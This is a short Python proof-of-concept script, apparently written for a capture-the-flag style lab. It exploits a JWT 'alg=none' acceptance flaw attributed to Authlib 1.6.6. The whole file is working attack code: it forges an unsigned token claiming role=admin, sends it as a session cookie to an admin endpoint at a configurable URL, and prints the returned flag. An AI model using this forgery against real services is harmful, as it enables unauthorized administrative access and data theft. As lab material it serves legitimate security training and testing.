#!/usr/bin/env python3
"""
Lab #2 - Voiding The Rules
Vulnerability : Authlib 1.6.6 accept alg=none (none-bypass)
Attack        : forge unsigned token with alg=none and role=admin
"""
import argparse, base64, json, sys
import requests
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #2 - Voiding The Rules PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def forge_none_token(payload: dict) -> str:
    h = b64url_enc(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
    p = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    return f'{h}.{p}.'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    log.info(f'Target: {base_url}')

    forged = forge_none_token({'name': 'hacker', 'role': 'admin'})
    log.info(f'Forged token: {forged}')

    r = requests.get(f'{base_url}/api/admin/data', cookies={'session': forged}, timeout=5)
    if r.status_code != 200:
        log.failure(f'Unexpected status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
